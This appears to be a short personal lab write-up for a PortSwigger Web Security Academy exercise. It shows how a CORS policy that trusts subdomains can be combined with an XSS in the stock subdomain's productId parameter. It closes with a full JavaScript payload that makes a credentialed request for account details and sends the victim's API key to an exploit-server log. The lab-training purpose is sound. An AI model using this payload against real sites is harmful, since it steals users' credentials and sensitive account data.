First we checked that if we change the sub-domain the response shows ACAO with the sub-domain included
![[Pasted image 20250214180745.png]]

For same reason you need to know where you can find a XXS, which is on the stock request in the productID parameter. The capture below shows the vulnerability
![[Pasted image 20250214182807.png]]
Then we can send this script to get the API Key

```JS
<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"</script>
```